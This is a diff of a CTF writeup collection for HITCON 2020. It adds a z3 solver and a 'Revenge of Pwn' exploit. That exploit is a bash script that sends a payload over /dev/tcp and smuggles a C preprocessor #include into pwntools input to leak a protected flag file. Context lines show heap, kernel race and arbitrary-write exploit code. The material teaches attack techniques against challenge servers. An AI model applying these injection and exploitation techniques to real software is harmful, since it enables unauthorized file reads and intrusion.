@@ -4,11 +4,11 @@ author: "mhackeroni team"
 comments: true
 ---
 
-This is the collection of writeups for HITCON 2020 by the mhackeroni team. 
+This is the collection of writeups for HITCON 2020 by the mhackeroni team.
 
 Index
 -------
-[welcome](#welcome) - [Revenge of Baby Shock](#revenge-of-baby-shock) - [Baby Shock](#baby-shock) - [L’Obscurité](http://www.babush.me/hitcon-ctf-2020-writeup.html) - [Telescope](#telescope) - [11011001](#11011001) - [SOP](#sop) - [Run Run Run](http://www.babush.me/hitcon-ctf-2020-writeup.html) - [AC1750](#ac1750) - [atoms](#atoms) - [Tenet](#tenet) - [dual](#dual) - [Revenge-of-Pwn](#revenge-of-pwn) - [sparks](#sparks) - [100 pins](#100-pins) 
+[welcome](#welcome) - [Revenge of Baby Shock](#revenge-of-baby-shock) - [Baby Shock](#baby-shock) - [L’Obscurité](http://www.babush.me/hitcon-ctf-2020-writeup.html) - [Telescope](#telescope) - [11011001](#11011001) - [SOP](#sop) - [Run Run Run](http://www.babush.me/hitcon-ctf-2020-writeup.html) - [AC1750](#ac1750) - [atoms](#atoms) - [Tenet](#tenet) - [dual](#dual) - [Revenge-of-Pwn](#revenge-of-pwn) - [sparks](#sparks) - [100 pins](#100-pins)
 #### [Comments section](#disqus_thread)
 
 
@@ -42,7 +42,7 @@ Revenge of Baby Shock
 
 ## The challenge
 
-It's identical to baby shock, but more characters are forbidden, including `;` and even a singke`.` 
+It's identical to baby shock, but more characters are forbidden, including `;` and even a singke`.`
 
 # The solution
 
@@ -115,12 +115,12 @@ points: 384
 solved: 5
 
 > Look up in the sky ⇑
-> 
+>
 > nc 13.112.193.37 8573
-> 
+>
 > Note:
 > The service is running on Ubuntu 20.04
-> 
+>
 > telescope-ae928e9f49db514cd0ac406a25cd8e149df8ddd971a229c8e3b4f46de397ea29.tar.gz
 
 
@@ -151,10 +151,10 @@ It asks for a slots index and then lets you write inside the chunk. The amount o
 
 #### [3] Free chunk
 It asks for a slot index. It calls `free` on the pointer stored at `slots[<index>]` .
-It stores 0 into `slots[<index>]`  and `slots_size[<index>]` 
+It stores 0 into `slots[<index>]`  and `slots_size[<index>]`
 
 #### [4] Protobuf unserialize and reserialize
-This is the most complicated option, and the only one that took a few hours to be completely understood. 
+This is the most complicated option, and the only one that took a few hours to be completely understood.
 It asks for a slot index.
 It parses the content with the protobuf parser generating the `Telescope` object.
 It checks that the field `pass` of the `Telescope` object is equal to `0xDEADBEEF`. If the `pass` field is not correctly set, you get an abort.
@@ -182,7 +182,7 @@ message Telescope {
 }
 ```
 
-There are 2 fields in this object. `pass` is optional and need to be set to 
+There are 2 fields in this object. `pass` is optional and need to be set to
 `0xDEADBEEF` because the code checks its value. `lens` is an array of integers. It can be empty or any size.
 
 It is vital to understand how the encoding of protobuf works.
@@ -235,8 +235,8 @@ In practice, we create a fake chunk header 0x10 bytes below one valid chunk. (Yo
 ### Allining the ~~Stars~~ Chunks
 To trigger the consolidate, we need our chunk to be contiguous to the top_chunk.
 The size of the chunk that we choose to make this attack is 0x458.
-Reason to choose this size: 
-- It needs NOT to be a fastbin. 
+Reason to choose this size:
+- It needs NOT to be a fastbin.
 - We need to be able to overwrite the prev_size filed.
 
 The prev_size fields are placed as the last 8 bytes of the chunks. `malloc(0x458)` will create a chunk of 0x460 bytes.
@@ -399,7 +399,100 @@ r.interactive()
 
 11011001
 --------
-TODO
+
+**Reverse - 255 pts**
+
+We are given a C++ binary, which seems heavily optimized and decompiles like a
+mess. The binary wants 20 unsigned 32-bit integers as inputs and performs some
+checks on them. If those checks pass, a SHA26 hash is computed and printed as
+part of the flag.
+
+The checks are kind of annoying to reverse-engineer, but in the end are pretty
+straightforward:
+
+1. Each number must be between `0` and `0xFFFFF`.
+2. There is a global table of 40 hardcoded values: each i-th input is and-ed
+   (binary and) with the value at `table[2*i]` and the result must be equal with
+   the value at `table[2*i+1]`.
+3. In each number, there cannot be three consecutive equal bits.
+4. There cannot be three equal bits at the same position in three consecutive
+   numbers.
+5. Each number must have exactly 10 bits set to `1`.
+6. The total number of `1` bits at the same position in all numbers must be
+   exactly 10.
+
+There are also other checks made by the program, but we did not get reverse
+those, because in the meantime we were writing a simple Python solver using
+[`z3`](https://pypi.org/project/z3-solver/), adding one check at the time and
+testing the result. After the 6th check above, our input got accepted by the
+program and it spit out the flag.
+
+Complete solution:
+
+```python
+#!/usr/bin/env python3
+# @dp_1, @mebeim - 2020-11-29
+
+import z3
+
+table = [0x81002, 0x1000, 0x29065, 0x29061, 0x2, 0x2, 0x16C40, 0x16C00,
+		 0x20905, 0x805, 0x10220, 0x220, 0x98868, 0x80860, 0x21102,
+		 0x21000, 0x491, 0x481, 0x31140, 0x1000, 0x801, 0x0, 0x60405,
+		 0x400, 0x0C860, 0x60, 0x508, 0x400, 0x40900, 0x800, 0x12213,
+		 0x10003, 0x428C0, 0x840, 0x840C, 0x0C, 0x43500, 0x2000, 0x8105A,
+		 0x1000]
+
+def popcount(v):
+	'''
+	Bit Twiddling Hacks FTW
+	https://graphics.stanford.edu/~seander/bithacks.html#CountBitsSetParallel
+	'''
+	w = v - ((v >> 1) & 0x55555555)
+	q = (w & 0x33333333) + ((w >> 2) & 0x33333333)
+	s = ((q + (q >> 4) & 0xF0F0F0F) * 0x1010101) >> 24
+	return s
+
+solver = z3.Solver()
+inp = [z3.BitVec('x{:02d}'.format(i), 8 * 4) for i in range(20)]
+
+for i, x in enumerate(inp):
+	solver.add(x & 0xFFF00000 == 0)
+	solver.add(x & table[2 * i] == table[2 * i + 1])
+
+	mask = 7
+	for j in range(18):
+		solver.add((x & mask) != (7<<j), x & mask != 0)
+		mask = mask << 1
+
+for off in range(20):
+	for i in range(1, len(inp)-1):
+		x = ((inp[i-1]>>off) & 1) + ((inp[i]>>off) & 1) + ((inp[i+1]>>off) & 1)
+		solver.add(x != 0, x != 3)
+
+for v in inp:
+	solver.add(popcount(v) == 10)
+
+for off in range(20):
+	x = (inp[0] >> off) & 1
+	for i in range(1, len(inp)):
+		x += (inp[i] >> off) & 1
+	solver.add(x == 10)
+
+res = solver.check()
+assert res == z3.sat
+
+m = solver.model()
+nums = [m[x].as_long() for x in inp]
+print(*nums)
+```
+
+And here it is in action:
+
+```
+$ ./solve.py | ./11011001
+Congratulations!
+Here's your gift: hitcon{fd05b10812d764abd7d853dfd24dbe6769a701eecae079e7d26570effc03e08d}
+```
 
 
 SOP
@@ -469,15 +562,15 @@ The seccomp filter, extracted using `seccomp_tools`, is as follows:
  0013: 0x20 0x00 0x00 0x00000010  A = fd # write(fd, buf, count)
  0014: 0x15 0x00 0x37 0x00000000  if (A != 0x0) goto 0070
  0015: 0x06 0x00 0x00 0x00000000  return KILL
- 
+
  0016: 0x20 0x00 0x00 0x00000018  A = args[1]
  0017: 0x07 0x00 0x00 0x00000000  X = A
  0018: 0x20 0x00 0x00 0x00000010  A = args[0]
  0019: 0x2c 0x00 0x00 0x00000000  A *= X
  0020: 0x15 0x28 0x28 0x00000000  goto 0061
- 
+
  [all other handlers omitted for brevity]
- 
+
  0061: 0x02 0x00 0x00 0x00000000  mem[0] = A
  0062: 0x20 0x00 0x00 0x00000020  A = args[2]
  0063: 0x07 0x00 0x00 0x00000000  X = A
@@ -584,7 +677,7 @@ for i in range(0, len(data), 8):
             args.append(hex(imm))
         else:
             break
-    
+
     assert sysno in syscalls
     disasm.append([syscalls[sysno], *args])
     #print(syscalls[sysno], ' '.join(args))
@@ -595,10 +688,10 @@ for i in range(0, len(data), 8):
 # set_tid_address value + prctl get_tid &dest -> dest = value
 def tid_prctl_mov(x):
     if x[0][0] == 'set_tid_address' and x[1][0] == 'prctl' and x[1][1] == '0x28':
-        
+
         val = x[0][1]
         dest = x[1][2]
-        
+
         # Dereference
         if dest[0] == '&': dest = dest[1:]
         else: dest = '*' + dest
@@ -610,7 +703,7 @@ def tid_prctl_mov(x):
 def prctl_name_strcpy(x):
     if x[0][0] == 'prctl' and x[1][0] == 'prctl':
         if x[0][1] == '0xf' and x[1][1] == '0x10':
-            
+
             src = x[0][2]
             dest = x[1][2]
 
@@ -687,7 +780,7 @@ for rule in rules:
                 disasm[i] = res
                 for j in range(i+1, i+used):
                     disasm[j] = []
-                
+
                 match = True
         except IndexError:
             pass
@@ -815,7 +908,7 @@ int main() {
     for(int i = 0; i < 4; i++) {
         input[0] = vals[i][0];
         input[1] = vals[i][1];
-        
+
         round_bk(&input[0], &input[1], k[i]);
         //printf("0x%08x 0x%08x\n", input[0], input[1]);
 
@@ -863,10 +956,10 @@ def decrypt(packet_hex):
 	enc = bytearray.fromhex(packet_hex[32:])
 	return c.decrypt(enc)
 
-	
+
 import json
 
-f = json.loads(open("traffic.json").read()) 
+f = json.loads(open("traffic.json").read())
 for p in f:
 	try:
 		p = p['_source']['layers']['udp']['udp.payload'].replace(':',"") #because wireshark hexdump is stupid
@@ -991,11 +1084,11 @@ points: 296
 solved: 17
 
 > A TOken-based Memory Storage.
-> 
+>
 > nc 13.231.7.116 9427
-> 
+>
 > atoms-22149cb3ad6bcb5d5d4213a70e11249a2188e9e4affa4b56387ab40f9d12748c.tar.gz
-> 
+>
 
 ### Challenge Release Content
 
@@ -1022,7 +1115,7 @@ index 7110906..beeb01f 100644
 @@ -409,9 +409,12 @@ static enum hrtimer_restart watchdog_timer_fn(struct hrtimer *hrtimer)
  			}
  		}
- 
+
 +#ifndef FLAG
 + #define FLAG "hitcon{<FLAG WILL BE HERE>}"
 +#endif
@@ -1093,7 +1186,7 @@ The module internally has the concept of `pool`. A `pool` is identified by a `to
 #### The Locks
 The module uses the kernel function `raw_spin_lock` to set up a lock on several resources.
 We identified three types of locks:
-**fd_lock**: This is a locking done on a file descriptor. The resource is stored in `priv_data` of the fd kernel structure. 
+**fd_lock**: This is a locking done on a file descriptor. The resource is stored in `priv_data` of the fd kernel structure.
 **pools_lock**: This lock is done when accessing the global variable array containing all the pools. This resource is stored as a global variable as well.
 **tk_lock**: A lock that is used to control access to a specific `pool`/`token`. This resource is store as part of the `pool` structure.
 
@@ -1128,7 +1221,7 @@ With this vulnerability, our focus changed from getting a **deadlock** to crash 
 
 
 ### The Exploit
-We modified the `demo.c` program to: 
+We modified the `demo.c` program to:
 - **allocate** multiple pages.
 - **deallocate** pages singularly until `ref_counter` reaches 0,
 - **spawn** several children that use the module.
@@ -1147,7 +1240,7 @@ The exploit is not 100% reliable. It happens (quite often) that the program term
 #include <sys/mman.h>
 #include <stdint.h>
 
-#define ATOMS_USE_TOKEN    0x4008D900 
+#define ATOMS_USE_TOKEN    0x4008D900
 #define ATOMS_ALLOC        0xC010D902
 #define ATOMS_RELEASE         0xD903
 #define ATOMS_INFO         0x8018D901
@@ -1220,7 +1313,7 @@ static void *mappa(int fd, uint64_t size){
   void *ptr = mmap(0, size, PROT_WRITE | PROT_READ, MAP_SHARED, fd, 0);
   printf("mem: %p\n", ptr);
   assert(ptr != MAP_FAILED);
-  return ptr;  
+  return ptr;
 }
 
 static void release(int fd){
@@ -1230,7 +1323,7 @@ static void release(int fd){
 static void fill_a_token(uint64_t token, int size){
   int fd = open_atoms();
   set_token(fd, token);
-  
+
   for (int i=0; i < 16; i++)
     alloca_size(fd, size);
 }
@@ -1253,7 +1346,7 @@ static void parent_work(int argc, char *argv[]) {
   puts("before set token");
   set_token(fd, TOKEN);
 
-  // allocate a multiple pages chunk  
+  // allocate a multiple pages chunk
   alloca_size(fd, 0x5000);
   uint8_t *ptr = mappa(fd, 0x5000);
   hex_printer(ptr, 0x10);
@@ -1345,13 +1438,13 @@ qemu-system-x86_64 \
   -m 256M -smp cores=2 \
   -device e1000,netdev=network0 \
   -netdev tap,id=network0,ifname=tap0,script=no,downscript=no \
-  -monitor none 
+  -monitor none
 ```
 `-s` is for enableing gdbserver on the kernel
-```   
+```
 -device e1000,netdev=network0 \
 -netdev tap,id=network0,ifname=tap0,script=no,downscript=no \
-``` 
+```
 to enable network communication between gest and host. You also need the network setup script and assign an IP in the machine. I achieved the IP assignment by modifying the init script of the initramfs.
 `nokaslr` as kernel option to disable kaslr.
 `cat /proc/kallsyms` from inside the vm to get position of functions inside the kernel.
@@ -1431,7 +1524,7 @@ The debugger, once started, also sets an 8byte cookie to ```0x2170000```, checks
 So the challenge was: write down an assembly that could erase the cookie when executed in the normal way and could restore it when executed with the same flow but reversed.
 Our first tought was to store it into a register and xor it to memory in a way that looked like this:
 ```
-mov rcx, 0x2170000                                                             
+mov rcx, 0x2170000
 mov rdx, 0x0     ; Clean rdx
 xor rdx, [rcx]   ; Set/erase rdx
 xor [rcx], rdx   ; Erase/set memory
@@ -1459,7 +1552,7 @@ add rcx, 0
 call confrontoHigh
 add rcx, 0
 
-mov rcx, rdx 
+mov rcx, rdx
 
 add rcx, 1
 call confrontoLow
@@ -1484,7 +1577,7 @@ add rcx, 15
 
 push 0 ; clean improvised stack
 ; reset a bunch of things just to be sure
-mov rsp, 0x2170500 
+mov rsp, 0x2170500
 mov rdx, 0x2170000
 mov rcx, 0x2170500
 xor rdx,rdx
@@ -1514,7 +1607,7 @@ jmp r14
 
 
 ; Check the lower nibble and jump to the calculated function offset
-confrontoLow: 
+confrontoLow:
 xor rbx,rbx
 mov bl, byte ptr[rcx]
 and bl, 0xf
@@ -1625,11 +1718,11 @@ fn write_bin(){
             return;
         }
     };
-    
+
     println!("bin_len>");
     let bin_len = read_int();
     let bin_vals = read(bin_len);
-    
+
     let (new_string, len) = encode(bin_vals, bin_len);
     // NO CHECK!
     node.text_index = add_pool(new_string);
@@ -1663,7 +1756,7 @@ def craft_node(_id, **kwargs):
     s += p64(kwargs.get("text_idx", 0x4141414141414141)
     s += p64(kwargs.get("stamp",0x4141414141414141 )
     return s
-    
+
 def forge_node(**kwargs):
     # write an empty b64 to cause the bug in the node 0
     write_bin(0, "")
@@ -1672,7 +1765,7 @@ def forge_node(**kwargs):
     node_id = create(0)
     # Create the bytes for the arbitrary node
     crafted = craft(node_id, **kwargs)
-    # Write it 
+    # Write it
     write_text(0, crafted)
     return node_id
 ```
@@ -1684,7 +1777,7 @@ The pseudo-rust of the connect_node function is:
 fn connect_node() {
     println!("pred_id>");
     let pred_id = read_int();
-    
+
     let pred_node = match find_node(root, pred_id) {
         Some(node) => node,
         None => {
@@ -1692,7 +1785,7 @@ fn connect_node() {
             return;
         }
     };
-    
+
     println!("succ_id>");
     let succ_id = read_int();
     let succ_node = match find_node(root, succ_id) {
@@ -1702,7 +1795,7 @@ fn connect_node() {
             return;
         }
     };
-    
+
     unsafe{
         let mut ptr = pred_node.edges;
         // check if the edge was already inserted
@@ -1711,19 +1804,19 @@ fn connect_node() {
                 return;
             }
         }
-        
+
         if pred_node.last_edge != pred_node.edges_end {
             // realloc pred_node.edges
             // and fix pred_node.last_edge
             // and pred_node.edges_end
-        } 
-        
+        }
+
         // write what where primitive
         *pred_node.last_edge = succ_node.this_index;
     }
 }
 ```
-So if we can craft two arbitrary nodes, we can use `connect_node` to get arbitrary write. 
+So if we can craft two arbitrary nodes, we can use `connect_node` to get arbitrary write.
 
 For the libc leak we can do the usual unsorted bin leak (free a chunk into the unsorted bin, then read the pointer to the arena that will be placed in the heap).
 Here we create a node with arbitrary big `text_len` to be able to read out of bound, then allocate and free a chunk to read the heap-metadata of the freed chunk.
@@ -1835,8 +1928,111 @@ p.interactive()
 ```
 
 Revenge of Pwn
---------
-TODO
+--------------
+
+**Misc, Pwn - 255 pts**
+
+Our task is to write an exploit to "pwn" a
+[`pwntools`](https://github.com/Gallopsled/pwntools) Python script that runs on
+the remtoe server. When we connect, we can upload an executable: this executable
+is then saved and exposed in the local on port 1337. Then, the Python script is
+started. Our executable does not have the right to read the flag, which is at
+`/home/deploy/flag`, but the Python script does. We need to find a way to make
+it read and spit out that file.
+
+The Python script does the following:
+
+1. Start listening on port 31337.
+2. Expect to receive a string containing a stack address
+   (`stack address @ 0xXXX`) from the program right away.
+3. Prepare and send a shellcode to our program. The shellcode is meant to leak
+   an `fd` number from the stack and send it back as a decimal string to the
+   Python script by conencting back to port 31337. The code sends the `fd`
+   number followed by a `@` character.
+4. Receive the leaked `fd` on port 31337, using `s.recvuntil('@')`.
+5. Use the value to craft some more shellcode which is then sent to our program.
+
+When receiving the `fd` number, the Python script treats it as a string without
+converting it to integer. When passing the string to the `shellcraft` function
+of `pwntools`, this value is directly inserted into an assembly program that is
+then passed to `cpp` (compiler) to evaluate preprocessor macros and then to `as`
+(assembler) to assemble it into the actual shellcode.
+
+Since we have control on the "vulnerable" program that the script tries to
+connect to, after sending a fake stack address, we can just connect back to the
+script on port 31337 and send an arbitrary string followed by `@`. This string
+will then be passed to `shellcraft`, and it ends up in the middle of the
+assembly program that is being compiled into shellcode.
+
+The remote server says `ELF size? (MAX: 6144)` when connecting, which makes it
+seems like it only accepts an ELF file. Sure, we could craft a very simple ELF
+that does a write plus connect, no big deal. However, we can send any kind of
+file and the serer will mark it as executable. We can therefore just send a Bash
+script as executable and make our life 10 times easier.
+
+Now in our executable we could just send `.incbin "/home/deploy/flag"` and have
+`as` include the flag as raw bytes in the resulting shellcode that is then sent
+back to us, but `pwntools`
+[makes some very strict sanity checks](https://github.com/Gallopsled/pwntools/blob/stable/pwnlib/util/safeeval.py#L46)
+on our string before actually inserting it into the assembly. Our string can
+only be a valid Python expression: it is compiled using
+[`compile()`](https://docs.python.org/3/library/functions.html#compile) and the
+resulting bytecode is checked against a whitelist of Python opcodes before being
+evaluated and inserted in the assembly. Long story short, we nee to pass this
+check and cannot just send arbitrary stuff.
+
+Since the assembly will be parsed by `cpp`, it can contain valid C preprocessor
+directives, like for example `#include`. Luckily, `#` in Python delimits the
+start of a comment, which is completely ignored by `compile()`. We can therefore
+send a number followed by a newline and then `#include </home/deploy/flag>@`.
+
+Here's the complete exploit:
+
+```bash
+#!/bin/bash
+# @mebeim - 2020-11-29
+
+{
+cat <<EOF
+122
+#!/bin/bash
+
+echo 'stack address @ 0x1234'
+sleep 1
+echo -e '123\n#include "/home/deploy/flag"@' > /dev/tcp/127.0.0.1/31337
+EOF
+} > /dev/tcp/3.115.58.219/9427
+```
+
+This will result in the remote `pwntools` trying to compile something like this:
+
+```
+    push 123
+#include </home/deploy/flag>
+    push 16384
+```
+
+Which will make `cpp` include the flag in the file. Afterwards, when passing the
+file to `as`, it will die because the source is invalid, and make `pwntools`
+dump the script and the flag to `stderr`:
+
+```
+[ERROR] An error occurred while assembling:
+       1: .section .shellcode,"awx"
+       2: .global _start
+       3: .global __start
+       4: _start:
+       5: __start:
+       6: .intel_syntax noprefix
+       7: stager_3:
+       8:     push 123
+       9: hitcon{use_pwntools_to_pwn_pwntools_^ovo^}
+      10:     push 16384
+...
+...
+/var/tmp/pwn-asm-bslk3jq9/step1:9: Error: no such instruction: `hitcon{use_pwntools_to_pwn_pwntools_^ovo^}'
+```
+
 
 sparks
 --------
@@ -2480,7 +2676,7 @@ int main(void)
 
 The challenge is made with NodeJS (15.3.0) and the main point was `Math.random()`. This PRNG [is not cryptographically secure](https://devdocs.io/javascript/global_objects/math/random), as we can recorver the initial states of the `XorShift128+` with enough consecutive outputs and some symbolic execution.
 
-We notice that the "Mastermind" behind this challenge allows us to gather more information than usual, because there is no check on the length of the input. In fact we can recover the (unique) digits of the pin choosing the pattern: `'1'*2^0 + '2'*2^1 + '3'*2^2 + '4'*2^3 + ... + '9'*2^8`. 
+We notice that the "Mastermind" behind this challenge allows us to gather more information than usual, because there is no check on the length of the input. In fact we can recover the (unique) digits of the pin choosing the pattern: `'1'*2^0 + '2'*2^1 + '3'*2^2 + '4'*2^3 + ... + '9'*2^8`.
 
 This gives us a result that tells us exactly the digits of the pin. We can get this by adding the number of digits in the correct position and the remaining number of correct digits that are not in the correct position. This number, in binary, gives us the corresponding digit in the pattern.
 
@@ -2660,7 +2856,7 @@ class Solver:
             if a == 0:
                 self.possibilities = [i for i in self.possibilities if not any([i[k] == x[k] for k in range(4)])]
             else:
-                self.possibilities = [i for i in self.possibilities if sum([i[k] == x[k] for k in range(4)]) == a] 
+                self.possibilities = [i for i in self.possibilities if sum([i[k] == x[k] for k in range(4)]) == a]
         elif a + b > 4:
             h = (bin(a + b)[2:])[::-1]
             h += '0000000000'
@@ -2678,7 +2874,7 @@ class Solver:
         self.found.append(x)
         self.possibilities = []
         self.foundPermutations = False
-        
+
 
 def guess_random(proc):
     pin = ''
@@ -2771,7 +2967,7 @@ def solve(proc):
 
 def main():
     x = True
-    while x: 
+    while x:
         try:
             host, port = '18.183.134.249', 1234
             with remote(host, port) as proc:
@@ -2903,4 +3099,3 @@ FLAG Unlocked: hitcon{even_my_c4t_can_s0lve_4_digits_pin_4A999B}
 [*] Got EOF while reading in interactive
 
 ```
-
